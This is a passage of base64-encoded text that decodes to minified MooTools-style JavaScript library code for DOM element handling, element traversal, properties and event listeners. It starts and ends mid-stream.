lbmQoSC5FbGVtZW50LnByb3RvdHlwZSxFbGVtZW50LlByb3RvdHlwZSk7fUQuY2FsbChCLmNvbnRlbnRXaW5kb3csQi5jb250ZW50V2luZG93LmRvY3VtZW50KTt9Oyghd2luZG93LmZyYW1lc1tDLmlkXSk/Qi5hZGRMaXN0ZW5lcigibG9hZCIsQSk6QSgpO3JldHVybiBCOwp9fSk7dmFyIEVsZW1lbnRzPW5ldyBOYXRpdmUoe2luaXRpYWxpemU6ZnVuY3Rpb24oRixCKXtCPSRleHRlbmQoe2RkdXA6dHJ1ZSxjYXNoOnRydWV9LEIpO0Y9Rnx8W107aWYoQi5kZHVwfHxCLmNhc2gpe3ZhciBHPXt9LEU9W107Zm9yKHZhciBDPTAsQT1GLmxlbmd0aDsKQzxBO0MrKyl7dmFyIEQ9JC5lbGVtZW50KEZbQ10sIUIuY2FzaCk7aWYoQi5kZHVwKXtpZihHW0QudWlkXSl7Y29udGludWU7fUdbRC51aWRdPXRydWU7fUUucHVzaChEKTt9Rj1FO31yZXR1cm4oQi5jYXNoKT8kZXh0ZW5kKEYsdGhpcyk6Rjt9fSk7RWxlbWVudHMuaW1wbGVtZW50KHtmaWx0ZXI6ZnVuY3Rpb24oQSxCKXtpZighQSl7cmV0dXJuIHRoaXM7Cn1yZXR1cm4gbmV3IEVsZW1lbnRzKEFycmF5LmZpbHRlcih0aGlzLCh0eXBlb2YgQT09InN0cmluZyIpP2Z1bmN0aW9uKEMpe3JldHVybiBDLm1hdGNoKEEpO306QSxCKSk7fX0pO0VsZW1lbnRzLm11bHRpPWZ1bmN0aW9uKEEpe3JldHVybiBmdW5jdGlvbigpe3ZhciBCPVtdOwp2YXIgRj10cnVlO2Zvcih2YXIgRD0wLEM9dGhpcy5sZW5ndGg7RDxDO0QrKyl7dmFyIEU9dGhpc1tEXVtBXS5hcHBseSh0aGlzW0RdLGFyZ3VtZW50cyk7Qi5wdXNoKEUpO2lmKEYpe0Y9KCR0eXBlKEUpPT0iZWxlbWVudCIpO319cmV0dXJuKEYpP25ldyBFbGVtZW50cyhCKTpCOwp9O307V2luZG93LmltcGxlbWVudCh7JDpmdW5jdGlvbihCLEMpe2lmKEImJkIuJGZhbWlseSYmQi51aWQpe3JldHVybiBCO312YXIgQT0kdHlwZShCKTtyZXR1cm4oJFtBXSk/JFtBXShCLEMsdGhpcy5kb2N1bWVudCk6bnVsbDt9LCQkOmZ1bmN0aW9uKEEpe2lmKGFyZ3VtZW50cy5sZW5ndGg9PTEmJnR5cGVvZiBBPT0ic3RyaW5nIil7cmV0dXJuIHRoaXMuZG9jdW1lbnQuZ2V0RWxlbWVudHMoQSk7Cn12YXIgRj1bXTt2YXIgQz1BcnJheS5mbGF0dGVuKGFyZ3VtZW50cyk7Zm9yKHZhciBEPTAsQj1DLmxlbmd0aDtEPEI7RCsrKXt2YXIgRT1DW0RdO3N3aXRjaCgkdHlwZShFKSl7Y2FzZSJlbGVtZW50IjpFPVtFXTticmVhaztjYXNlInN0cmluZyI6RT10aGlzLmRvY3VtZW50LmdldEVsZW1lbnRzKEUsdHJ1ZSk7CmJyZWFrO2RlZmF1bHQ6RT1mYWxzZTt9aWYoRSl7Ri5leHRlbmQoRSk7fX1yZXR1cm4gbmV3IEVsZW1lbnRzKEYpO30sZ2V0RG9jdW1lbnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5kb2N1bWVudDt9LGdldFdpbmRvdzpmdW5jdGlvbigpe3JldHVybiB0aGlzO319KTsKJC5zdHJpbmc9ZnVuY3Rpb24oQyxCLEEpe0M9QS5nZXRFbGVtZW50QnlJZChDKTtyZXR1cm4oQyk/JC5lbGVtZW50KEMsQik6bnVsbDt9OyQuZWxlbWVudD1mdW5jdGlvbihBLEQpeyR1aWQoQSk7aWYoIUQmJiFBLiRmYW1pbHkmJiEoL15vYmplY3R8ZW1iZWQkL2kpLnRlc3QoQS50YWdOYW1lKSl7dmFyIEI9RWxlbWVudC5Qcm90b3R5cGU7CmZvcih2YXIgQyBpbiBCKXtBW0NdPUJbQ107fX1yZXR1cm4gQTt9OyQub2JqZWN0PWZ1bmN0aW9uKEIsQyxBKXtpZihCLnRvRWxlbWVudCl7cmV0dXJuICQuZWxlbWVudChCLnRvRWxlbWVudChBKSxDKTt9cmV0dXJuIG51bGw7fTskLnRleHRub2RlPSQud2hpdGVzcGFjZT0kLndpbmRvdz0kLmRvY3VtZW50PSRhcmd1bWVudHMoMCk7Ck5hdGl2ZS5pbXBsZW1lbnQoW0VsZW1lbnQsRG9jdW1lbnRdLHtnZXRFbGVtZW50OmZ1bmN0aW9uKEEsQil7cmV0dXJuICQodGhpcy5nZXRFbGVtZW50cyhBLHRydWUpWzBdfHxudWxsLEIpO30sZ2V0RWxlbWVudHM6ZnVuY3Rpb24oQSxEKXtBPUEuc3BsaXQoIiwiKTsKdmFyIEM9W107dmFyIEI9KEEubGVuZ3RoPjEpO0EuZWFjaChmdW5jdGlvbihFKXt2YXIgRj10aGlzLmdldEVsZW1lbnRzQnlUYWdOYW1lKEUudHJpbSgpKTsoQik/Qy5leHRlbmQoRik6Qz1GO30sdGhpcyk7cmV0dXJuIG5ldyBFbGVtZW50cyhDLHtkZHVwOkIsY2FzaDohRH0pOwp9fSk7RWxlbWVudC5TdG9yYWdlPXtnZXQ6ZnVuY3Rpb24oQSl7cmV0dXJuKHRoaXNbQV18fCh0aGlzW0FdPXt9KSk7fX07RWxlbWVudC5JbnNlcnRlcnM9bmV3IEhhc2goe2JlZm9yZTpmdW5jdGlvbihCLEEpe2lmKEEucGFyZW50Tm9kZSl7QS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShCLEEpOwp9fSxhZnRlcjpmdW5jdGlvbihCLEEpe2lmKCFBLnBhcmVudE5vZGUpe3JldHVybiA7fXZhciBDPUEubmV4dFNpYmxpbmc7KEMpP0EucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoQixDKTpBLnBhcmVudE5vZGUuYXBwZW5kQ2hpbGQoQik7fSxib3R0b206ZnVuY3Rpb24oQixBKXtBLmFwcGVuZENoaWxkKEIpOwp9LHRvcDpmdW5jdGlvbihCLEEpe3ZhciBDPUEuZmlyc3RDaGlsZDsoQyk/QS5pbnNlcnRCZWZvcmUoQixDKTpBLmFwcGVuZENoaWxkKEIpO319KTtFbGVtZW50Lkluc2VydGVycy5pbnNpZGU9RWxlbWVudC5JbnNlcnRlcnMuYm90dG9tO0VsZW1lbnQuSW5zZXJ0ZXJzLmVhY2goZnVuY3Rpb24oQyxCKXt2YXIgQT1CLmNhcGl0YWxpemUoKTsKRWxlbWVudC5pbXBsZW1lbnQoImluamVjdCIrQSxmdW5jdGlvbihEKXtDKHRoaXMsJChELHRydWUpKTtyZXR1cm4gdGhpczt9KTtFbGVtZW50LmltcGxlbWVudCgiZ3JhYiIrQSxmdW5jdGlvbihEKXtDKCQoRCx0cnVlKSx0aGlzKTtyZXR1cm4gdGhpczt9KTt9KTtFbGVtZW50LmltcGxlbWVudCh7Z2V0RG9jdW1lbnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5vd25lckRvY3VtZW50Owp9LGdldFdpbmRvdzpmdW5jdGlvbigpe3JldHVybiB0aGlzLm93bmVyRG9jdW1lbnQuZ2V0V2luZG93KCk7fSxnZXRFbGVtZW50QnlJZDpmdW5jdGlvbihELEMpe3ZhciBCPXRoaXMub3duZXJEb2N1bWVudC5nZXRFbGVtZW50QnlJZChEKTtpZighQil7cmV0dXJuIG51bGw7Cn1mb3IodmFyIEE9Qi5wYXJlbnROb2RlO0EhPXRoaXM7QT1BLnBhcmVudE5vZGUpe2lmKCFBKXtyZXR1cm4gbnVsbDt9fXJldHVybiAkLmVsZW1lbnQoQixDKTt9LHNldDpmdW5jdGlvbihELEIpe3N3aXRjaCgkdHlwZShEKSl7Y2FzZSJvYmplY3QiOmZvcih2YXIgQyBpbiBEKXt0aGlzLnNldChDLERbQ10pOwp9YnJlYWs7Y2FzZSJzdHJpbmciOnZhciBBPUVsZW1lbnQuUHJvcGVydGllcy5nZXQoRCk7KEEmJkEuc2V0KT9BLnNldC5hcHBseSh0aGlzLEFycmF5LnNsaWNlKGFyZ3VtZW50cywxKSk6dGhpcy5zZXRQcm9wZXJ0eShELEIpO31yZXR1cm4gdGhpczt9LGdldDpmdW5jdGlvbihCKXt2YXIgQT1FbGVtZW50LlByb3BlcnRpZXMuZ2V0KEIpOwpyZXR1cm4oQSYmQS5nZXQpP0EuZ2V0LmFwcGx5KHRoaXMsQXJyYXkuc2xpY2UoYXJndW1lbnRzLDEpKTp0aGlzLmdldFByb3BlcnR5KEIpO30sZXJhc2U6ZnVuY3Rpb24oQil7dmFyIEE9RWxlbWVudC5Qcm9wZXJ0aWVzLmdldChCKTsoQSYmQS5lcmFzZSk/QS5lcmFzZS5hcHBseSh0aGlzLEFycmF5LnNsaWNlKGFyZ3VtZW50cywxKSk6dGhpcy5yZW1vdmVQcm9wZXJ0eShCKTsKcmV0dXJuIHRoaXM7fSxtYXRjaDpmdW5jdGlvbihBKXtyZXR1cm4oIUF8fEVsZW1lbnQuZ2V0KHRoaXMsInRhZyIpPT1BKTt9LGluamVjdDpmdW5jdGlvbihCLEEpe0VsZW1lbnQuSW5zZXJ0ZXJzLmdldChBfHwiYm90dG9tIikodGhpcywkKEIsdHJ1ZSkpO3JldHVybiB0aGlzOwp9LHdyYXBzOmZ1bmN0aW9uKEIsQSl7Qj0kKEIsdHJ1ZSk7cmV0dXJuIHRoaXMucmVwbGFjZXMoQikuZ3JhYihCLEEpO30sZ3JhYjpmdW5jdGlvbihCLEEpe0VsZW1lbnQuSW5zZXJ0ZXJzLmdldChBfHwiYm90dG9tIikoJChCLHRydWUpLHRoaXMpO3JldHVybiB0aGlzOwp9LGFwcGVuZFRleHQ6ZnVuY3Rpb24oQixBKXtyZXR1cm4gdGhpcy5ncmFiKHRoaXMuZ2V0RG9jdW1lbnQoKS5uZXdUZXh0Tm9kZShCKSxBKTt9LGFkb3B0OmZ1bmN0aW9uKCl7QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpLmVhY2goZnVuY3Rpb24oQSl7QT0kKEEsdHJ1ZSk7CmlmKEEpe3RoaXMuYXBwZW5kQ2hpbGQoQSk7fX0sdGhpcyk7cmV0dXJuIHRoaXM7fSxkaXNwb3NlOmZ1bmN0aW9uKCl7cmV0dXJuKHRoaXMucGFyZW50Tm9kZSk/dGhpcy5wYXJlbnROb2RlLnJlbW92ZUNoaWxkKHRoaXMpOnRoaXM7fSxjbG9uZTpmdW5jdGlvbihELEMpe3N3aXRjaCgkdHlwZSh0aGlzKSl7Y2FzZSJlbGVtZW50Ijp2YXIgSD17fTsKZm9yKHZhciBHPTAsRT10aGlzLmF0dHJpYnV0ZXMubGVuZ3RoO0c8RTtHKyspe3ZhciBCPXRoaXMuYXR0cmlidXRlc1tHXSxMPUIubm9kZU5hbWUudG9Mb3dlckNhc2UoKTtpZihCcm93c2VyLkVuZ2luZS50cmlkZW50JiYoL2lucHV0L2kpLnRlc3QodGhpcy50YWdOYW1lKSYmKC93aWR0aHxoZWlnaHQvKS50ZXN0KEwpKXtjb250aW51ZTsKfXZhciBLPShMPT0ic3R5bGUiJiZ0aGlzLnN0eWxlKT90aGlzLnN0eWxlLmNzc1RleHQ6Qi5ub2RlVmFsdWU7aWYoISRjaGsoSyl8fEw9PSJ1aWQifHwoTD09ImlkIiYmIUMpKXtjb250aW51ZTt9aWYoSyE9ImluaGVyaXQiJiZbInN0cmluZyIsIm51bWJlciJdLmNvbnRhaW5zKCR0eXBlKEspKSl7SFtMXT1LOwp9fXZhciBKPW5ldyBFbGVtZW50KHRoaXMubm9kZU5hbWUudG9Mb3dlckNhc2UoKSxIKTtpZihEIT09ZmFsc2Upe2Zvcih2YXIgST0wLEY9dGhpcy5jaGlsZE5vZGVzLmxlbmd0aDtJPEY7SSsrKXt2YXIgQT1FbGVtZW50LmNsb25lKHRoaXMuY2hpbGROb2Rlc1tJXSx0cnVlLEMpOwppZihBKXtKLmdyYWIoQSk7fX19cmV0dXJuIEo7Y2FzZSJ0ZXh0bm9kZSI6cmV0dXJuIGRvY3VtZW50Lm5ld1RleHROb2RlKHRoaXMubm9kZVZhbHVlKTt9cmV0dXJuIG51bGw7fSxyZXBsYWNlczpmdW5jdGlvbihBKXtBPSQoQSx0cnVlKTtBLnBhcmVudE5vZGUucmVwbGFjZUNoaWxkKHRoaXMsQSk7CnJldHVybiB0aGlzO30saGFzQ2xhc3M6ZnVuY3Rpb24oQSl7cmV0dXJuIHRoaXMuY2xhc3NOYW1lLmNvbnRhaW5zKEEsIiAiKTt9LGFkZENsYXNzOmZ1bmN0aW9uKEEpe2lmKCF0aGlzLmhhc0NsYXNzKEEpKXt0aGlzLmNsYXNzTmFtZT0odGhpcy5jbGFzc05hbWUrIiAiK0EpLmNsZWFuKCk7Cn1yZXR1cm4gdGhpczt9LHJlbW92ZUNsYXNzOmZ1bmN0aW9uKEEpe3RoaXMuY2xhc3NOYW1lPXRoaXMuY2xhc3NOYW1lLnJlcGxhY2UobmV3IFJlZ0V4cCgiKF58XFxzKSIrQSsiKD86XFxzfCQpIiksIiQxIikuY2xlYW4oKTtyZXR1cm4gdGhpczt9LHRvZ2dsZUNsYXNzOmZ1bmN0aW9uKEEpe3JldHVybiB0aGlzLmhhc0NsYXNzKEEpP3RoaXMucmVtb3ZlQ2xhc3MoQSk6dGhpcy5hZGRDbGFzcyhBKTsKfSxnZXRDb21wdXRlZFN0eWxlOmZ1bmN0aW9uKEIpe2lmKHRoaXMuY3VycmVudFN0eWxlKXtyZXR1cm4gdGhpcy5jdXJyZW50U3R5bGVbQi5jYW1lbENhc2UoKV07fXZhciBBPXRoaXMuZ2V0V2luZG93KCkuZ2V0Q29tcHV0ZWRTdHlsZSh0aGlzLG51bGwpO3JldHVybihBKT9BLmdldFByb3BlcnR5VmFsdWUoW0IuaHlwaGVuYXRlKCldKTpudWxsOwp9LGVtcHR5OmZ1bmN0aW9uKCl7JEEodGhpcy5jaGlsZE5vZGVzKS5lYWNoKGZ1bmN0aW9uKEEpe0Jyb3dzZXIuZnJlZU1lbShBKTtFbGVtZW50LmVtcHR5KEEpO0VsZW1lbnQuZGlzcG9zZShBKTt9LHRoaXMpO3JldHVybiB0aGlzO30sZGVzdHJveTpmdW5jdGlvbigpe0Jyb3dzZXIuZnJlZU1lbSh0aGlzLmVtcHR5KCkuZGlzcG9zZSgpKTsKcmV0dXJuIG51bGw7fSxnZXRTZWxlY3RlZDpmdW5jdGlvbigpe3JldHVybiBuZXcgRWxlbWVudHMoJEEodGhpcy5vcHRpb25zKS5maWx0ZXIoZnVuY3Rpb24oQSl7cmV0dXJuIEEuc2VsZWN0ZWQ7fSkpO30sdG9RdWVyeVN0cmluZzpmdW5jdGlvbigpe3ZhciBBPVtdOwp0aGlzLmdldEVsZW1lbnRzKCJpbnB1dCwgc2VsZWN0LCB0ZXh0YXJlYSIpLmVhY2goZnVuY3Rpb24oQil7aWYoIUIubmFtZXx8Qi5kaXNhYmxlZCl7cmV0dXJuIDt9dmFyIEM9KEIudGFnTmFtZS50b0xvd2VyQ2FzZSgpPT0ic2VsZWN0Iik/RWxlbWVudC5nZXRTZWxlY3RlZChCKS5tYXAoZnVuY3Rpb24oRCl7cmV0dXJuIEQudmFsdWU7Cn0pOigoQi50eXBlPT0icmFkaW8ifHxCLnR5cGU9PSJjaGVja2JveCIpJiYhQi5jaGVja2VkKT9udWxsOkIudmFsdWU7JHNwbGF0KEMpLmVhY2goZnVuY3Rpb24oRCl7aWYoRCl7QS5wdXNoKEIubmFtZSsiPSIrZW5jb2RlVVJJQ29tcG9uZW50KEQpKTt9fSk7fSk7cmV0dXJuIEEuam9pbigiJiIpOwp9LGdldFByb3BlcnR5OmZ1bmN0aW9uKEMpe3ZhciBCPUVsZW1lbnQuQXR0cmlidXRlcyxBPUIuUHJvcHNbQ107dmFyIEQ9KEEpP3RoaXNbQV06dGhpcy5nZXRBdHRyaWJ1dGUoQywyKTtyZXR1cm4oQi5Cb29sc1tDXSk/ISFEOihBKT9EOkR8fG51bGw7fSxnZXRQcm9wZXJ0aWVzOmZ1bmN0aW9uKCl7dmFyIEE9JEEoYXJndW1lbnRzKTsKcmV0dXJuIEEubWFwKGZ1bmN0aW9uKEIpe3JldHVybiB0aGlzLmdldFByb3BlcnR5KEIpO30sdGhpcykuYXNzb2NpYXRlKEEpO30sc2V0UHJvcGVydHk6ZnVuY3Rpb24oRCxFKXt2YXIgQz1FbGVtZW50LkF0dHJpYnV0ZXMsQj1DLlByb3BzW0RdLEE9JGRlZmluZWQoRSk7CmlmKEImJkMuQm9vbHNbRF0pe0U9KEV8fCFBKT90cnVlOmZhbHNlO31lbHNle2lmKCFBKXtyZXR1cm4gdGhpcy5yZW1vdmVQcm9wZXJ0eShEKTt9fShCKT90aGlzW0JdPUU6dGhpcy5zZXRBdHRyaWJ1dGUoRCxFKTtyZXR1cm4gdGhpczt9LHNldFByb3BlcnRpZXM6ZnVuY3Rpb24oQSl7Zm9yKHZhciBCIGluIEEpe3RoaXMuc2V0UHJvcGVydHkoQixBW0JdKTsKfXJldHVybiB0aGlzO30scmVtb3ZlUHJvcGVydHk6ZnVuY3Rpb24oRCl7dmFyIEM9RWxlbWVudC5BdHRyaWJ1dGVzLEI9Qy5Qcm9wc1tEXSxBPShCJiZDLkJvb2xzW0RdKTsoQik/dGhpc1tCXT0oQSk/ZmFsc2U6IiI6dGhpcy5yZW1vdmVBdHRyaWJ1dGUoRCk7cmV0dXJuIHRoaXM7Cn0scmVtb3ZlUHJvcGVydGllczpmdW5jdGlvbigpe0FycmF5LmVhY2goYXJndW1lbnRzLHRoaXMucmVtb3ZlUHJvcGVydHksdGhpcyk7cmV0dXJuIHRoaXM7fX0pOyhmdW5jdGlvbigpe3ZhciBBPWZ1bmN0aW9uKEQsQixJLEMsRixIKXt2YXIgRT1EW0l8fEJdO3ZhciBHPVtdOwp3aGlsZShFKXtpZihFLm5vZGVUeXBlPT0xJiYoIUN8fEVsZW1lbnQubWF0Y2goRSxDKSkpe0cucHVzaChFKTtpZighRil7YnJlYWs7fX1FPUVbQl07fXJldHVybihGKT9uZXcgRWxlbWVudHMoRyx7ZGR1cDpmYWxzZSxjYXNoOiFIfSk6JChHWzBdLEgpO307RWxlbWVudC5pbXBsZW1lbnQoe2dldFByZXZpb3VzOmZ1bmN0aW9uKEIsQyl7cmV0dXJuIEEodGhpcywicHJldmlvdXNTaWJsaW5nIixudWxsLEIsZmFsc2UsQyk7Cn0sZ2V0QWxsUHJldmlvdXM6ZnVuY3Rpb24oQixDKXtyZXR1cm4gQSh0aGlzLCJwcmV2aW91c1NpYmxpbmciLG51bGwsQix0cnVlLEMpO30sZ2V0TmV4dDpmdW5jdGlvbihCLEMpe3JldHVybiBBKHRoaXMsIm5leHRTaWJsaW5nIixudWxsLEIsZmFsc2UsQyk7fSxnZXRBbGxOZXh0OmZ1bmN0aW9uKEIsQyl7cmV0dXJuIEEodGhpcywibmV4dFNpYmxpbmciLG51bGwsQix0cnVlLEMpOwp9LGdldEZpcnN0OmZ1bmN0aW9uKEIsQyl7cmV0dXJuIEEodGhpcywibmV4dFNpYmxpbmciLCJmaXJzdENoaWxkIixCLGZhbHNlLEMpO30sZ2V0TGFzdDpmdW5jdGlvbihCLEMpe3JldHVybiBBKHRoaXMsInByZXZpb3VzU2libGluZyIsImxhc3RDaGlsZCIsQixmYWxzZSxDKTsKfSxnZXRQYXJlbnQ6ZnVuY3Rpb24oQixDKXtyZXR1cm4gQSh0aGlzLCJwYXJlbnROb2RlIixudWxsLEIsZmFsc2UsQyk7fSxnZXRQYXJlbnRzOmZ1bmN0aW9uKEIsQyl7cmV0dXJuIEEodGhpcywicGFyZW50Tm9kZSIsbnVsbCxCLHRydWUsQyk7fSxnZXRDaGlsZHJlbjpmdW5jdGlvbihCLEMpe3JldHVybiBBKHRoaXMsIm5leHRTaWJsaW5nIiwiZmlyc3RDaGlsZCIsQix0cnVlLEMpOwp9LGhhc0NoaWxkOmZ1bmN0aW9uKEIpe0I9JChCLHRydWUpO3JldHVybighIUImJiRBKHRoaXMuZ2V0RWxlbWVudHNCeVRhZ05hbWUoQi50YWdOYW1lKSkuY29udGFpbnMoQikpO319KTt9KSgpO0VsZW1lbnQuUHJvcGVydGllcz1uZXcgSGFzaDtFbGVtZW50LlByb3BlcnRpZXMuc3R5bGU9e3NldDpmdW5jdGlvbihBKXt0aGlzLnN0eWxlLmNzc1RleHQ9QTsKfSxnZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5zdHlsZS5jc3NUZXh0O30sZXJhc2U6ZnVuY3Rpb24oKXt0aGlzLnN0eWxlLmNzc1RleHQ9IiI7fX07RWxlbWVudC5Qcm9wZXJ0aWVzLnRhZz17Z2V0OmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMudGFnTmFtZS50b0xvd2VyQ2FzZSgpOwp9fTtFbGVtZW50LlByb3BlcnRpZXMuaHJlZj17Z2V0OmZ1bmN0aW9uKCl7cmV0dXJuKCF0aGlzLmhyZWYpP251bGw6dGhpcy5ocmVmLnJlcGxhY2UobmV3IFJlZ0V4cCgiXiIrZG9jdW1lbnQubG9jYXRpb24ucHJvdG9jb2wrIi8vIitkb2N1bWVudC5sb2NhdGlvbi5ob3N0KSwiIik7Cn19O0VsZW1lbnQuUHJvcGVydGllcy5odG1sPXtzZXQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5pbm5lckhUTUw9QXJyYXkuZmxhdHRlbihhcmd1bWVudHMpLmpvaW4oIiIpO319O05hdGl2ZS5pbXBsZW1lbnQoW0VsZW1lbnQsV2luZG93LERvY3VtZW50XSx7YWRkTGlzdGVuZXI6ZnVuY3Rpb24oQixBKXtpZih0aGlzLmFkZEV2ZW50TGlzdGVuZXIpe3RoaXMuYWRkRXZlbnRMaXN0ZW5lcihCLEEsZmFsc2UpOwp9ZWxzZXt0aGlzLmF0dGFjaEV2ZW50KCJvbiIrQixBKTt9cmV0dXJuIHRoaXM7fSxyZW1vdmVMaXN0ZW5lcjpmdW5jdGlvbihCLEEpe2lmKHRoaXMucmVtb3ZlRXZlbnRMaXN0ZW5lcil7dGhpcy5yZW1vdmVFdmVudExpc3RlbmVyKEIsQSxmYWxzZSk7fWVsc2V7dGhpcy5kZXRhY2hFdmVudCgib24iK0IsQSk7Cn1yZXR1cm4gdGhpczt9LHJldHJpZXZlOmZ1bmN0aW9uKEIsQSl7dmFyIEQ9RWxlbWVudC5TdG9yYWdlLmdldCh0aGlzLnVpZCk7dmFyIEM9RFtCXTtpZigkZGVmaW5lZChBKSYmISRkZWZpbmVkKEMpKXtDPURbQl09QTt9cmV0dXJuICRwaWNrKEMpO30sc3RvcmU6ZnVuY3Rpb24oQixBKXt2YXIgQz1FbGVtZW50LlN0b3JhZ2UuZ2V0KHRoaXMudWlkKTsKQ1tCXT1BO3JldHVybiB0aGlzO30sZWxpbWluYXRlOmZ1bmN0aW9uKEEpe3ZhciBCPUVsZW1lbnQuU3RvcmFnZS5nZXQodGhpcy51aWQpO2RlbGV0ZSBCW0FdO3JldHVybiB0aGlzO319KTtFbGVtZW50LkF0dHJpYnV0ZXM9bmV3IEhhc2goe1Byb3BzOntodG1sOiJpbm5lckhUTUwiLCJjbGFzcyI6ImNsYXNzTmFtZSIsImZvciI6Imh0bWxGb3IiLHRleHQ6KEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpPyJpbm5lclRleHQiOiJ0ZXh0Q29udGVudCJ9LEJvb2xzOlsiY29tcGFjdCIsIm5vd3JhcCIsImlzbWFwIiwiZGVjbGFyZSIsIm5vc2hhZGUiLCJjaGVja2VkIiwiZGlzYWJsZWQiLCJyZWFkb25seSIsIm11bHRpcGxlIiwic2VsZWN0ZWQiLCJub3Jlc2l6ZSIsImRlZmVyIl0sQ2FtZWxzOlsidmFsdWUiLCJhY2Nlc3NLZXkiLCJjZWxsUGFkZGluZyIsImNlbGxTcGFjaW5nIiwiY29sU3BhbiIsImZyYW1lQm9yZGVyIiwibWF4TGVuZ3RoIiwicmVhZE9ubHkiLCJyb3dTcGFuIiwidGFiSW5kZXgiLCJ1c2VNYXAiXX0pOwpCcm93c2VyLmZyZWVNZW09ZnVuY3Rpb24oQSl7aWYoIUEpe3JldHVybiA7fWlmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQmJigvb2JqZWN0L2kpLnRlc3QoQS50YWdOYW1lKSl7Zm9yKHZhciBCIGluIEEpe2lmKHR5cGVvZiBBW0JdPT0iZnVuY3Rpb24iKXtBW0JdPSRlbXB0eTsKfX1FbGVtZW50LmRpc3Bvc2UoQSk7fWlmKEEudWlkJiZBLnJlbW92ZUV2ZW50cyl7QS5yZW1vdmVFdmVudHMoKTt9fTsoZnVuY3Rpb24oQil7dmFyIEM9Qi5Cb29scyxBPUIuQ2FtZWxzO0IuQm9vbHM9Qz1DLmFzc29jaWF0ZShDKTtIYXNoLmV4dGVuZChIYXNoLmNvbWJpbmUoQi5Qcm9wcyxDKSxBLmFzc29jaWF0ZShBLm1hcChmdW5jdGlvbihEKXtyZXR1cm4gRC50b0xvd2VyQ2FzZSgpOwp9KSkpO0IuZXJhc2UoIkNhbWVscyIpO30pKEVsZW1lbnQuQXR0cmlidXRlcyk7d2luZG93LmFkZExpc3RlbmVyKCJ1bmxvYWQiLGZ1bmN0aW9uKCl7d2luZG93LnJlbW92ZUxpc3RlbmVyKCJ1bmxvYWQiLGFyZ3VtZW50cy5jYWxsZWUpO2RvY3VtZW50LnB1cmdlKCk7CmlmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe0NvbGxlY3RHYXJiYWdlKCk7fX0pO0VsZW1lbnQuUHJvcGVydGllcy5ldmVudHM9e3NldDpmdW5jdGlvbihBKXt0aGlzLmFkZEV2ZW50cyhBKTt9fTtOYXRpdmUuaW1wbGVtZW50KFtFbGVtZW50LFdpbmRvdyxEb2N1bWVudF0se2FkZEV2ZW50OmZ1bmN0aW9uKEUsRyl7dmFyIEg9dGhpcy5yZXRyaWV2ZSgiZXZlbnRzIix7fSk7CkhbRV09SFtFXXx8e2tleXM6W10sdmFsdWVzOltdfTtpZihIW0VdLmtleXMuY29udGFpbnMoRykpe3JldHVybiB0aGlzO31IW0VdLmtleXMucHVzaChHKTt2YXIgRj1FLEE9RWxlbWVudC5FdmVudHMuZ2V0KEUpLEM9RyxJPXRoaXM7aWYoQSl7aWYoQS5vbkFkZCl7QS5vbkFkZC5jYWxsKHRoaXMsRyk7Cn1pZihBLmNvbmRpdGlvbil7Qz1mdW5jdGlvbihKKXtpZihBLmNvbmRpdGlvbi5jYWxsKHRoaXMsSikpe3JldHVybiBHLmNhbGwodGhpcyxKKTt9cmV0dXJuIGZhbHNlO307fUY9QS5iYXNlfHxGO312YXIgRD1mdW5jdGlvbigpe3JldHVybiBHLmNhbGwoSSk7fTt2YXIgQj1FbGVtZW50Lk5hdGl2ZUV2ZW50c1tGXXx8MDsKaWYoQil7aWYoQj09Mil7RD1mdW5jdGlvbihKKXtKPW5ldyBFdmVudChKLEkuZ2V0V2luZG93KCkpO2lmKEMuY2FsbChJLEopPT09ZmFsc2Upe0ouc3RvcCgpO319O310aGlzLmFkZExpc3RlbmVyKEYsRCk7fUhbRV0udmFsdWVzLnB1c2goRCk7cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudDpmdW5jdGlvbihELEMpe3ZhciBCPXRoaXMucmV0cmlldmUoImV2ZW50cyIpOwppZighQnx8IUJbRF0pe3JldHVybiB0aGlzO312YXIgRz1CW0RdLmtleXMuaW5kZXhPZihDKTtpZihHPT0tMSl7cmV0dXJuIHRoaXM7fXZhciBBPUJbRF0ua2V5cy5zcGxpY2UoRywxKVswXTt2YXIgRj1CW0RdLnZhbHVlcy5zcGxpY2UoRywxKVswXTt2YXIgRT1FbGVtZW50LkV2ZW50cy5nZXQoRCk7CmlmKEUpe2lmKEUub25SZW1vdmUpe0Uub25SZW1vdmUuY2FsbCh0aGlzLEMpO31EPUUuYmFzZXx8RDt9cmV0dXJuKEVsZW1lbnQuTmF0aXZlRXZlbnRzW0RdKT90aGlzLnJlbW92ZUxpc3RlbmVyKEQsRik6dGhpczt9LGFkZEV2ZW50czpmdW5jdGlvbihBKXtmb3IodmFyIEIgaW4gQSl7dGhpcy5hZGRFdmVudChCLEFbQl0pOwp9cmV0dXJuIHRoaXM7fSxyZW1vdmVFdmVudHM6ZnVuY3Rpb24oQil7dmFyIEE9dGhpcy5yZXRyaWV2ZSgiZXZlbnRzIik7aWYoIUEpe3JldHVybiB0aGlzO31pZighQil7Zm9yKHZhciBDIGluIEEpe3RoaXMucmVtb3ZlRXZlbnRzKEMpO31BPW51bGw7fWVsc2V7aWYoQVtCXSl7d2hpbGUoQVtCXS5rZXlzWzBdKXt0aGlzLnJlbW92ZUV2ZW50KEIsQVtCXS5rZXlzWzBdKTsKfUFbQl09bnVsbDt9fXJldHVybiB0aGlzO30sZmlyZUV2ZW50OmZ1bmN0aW9uKEQsQixBKXt2YXIgQz10aGlzLnJldHJpZXZlKCJldmVudHMiKTtpZighQ3x8IUNbRF0pe3JldHVybiB0aGlzO31DW0RdLmtleXMuZWFjaChmdW5jdGlvbihFKXtFLmNyZWF0ZSh7YmluZDp0aGlzLGRlbGF5OkEsImFyZ3VtZW50cyI6Qn0pKCk7Cn0sdGhpcyk7cmV0dXJuIHRoaXM7fSxjbG9uZUV2ZW50czpmdW5jdGlvbihELEEpe0Q9JChEKTt2YXIgQz1ELnJldHJpZXZlKCJldmVudHMiKTtpZighQyl7cmV0dXJuIHRoaX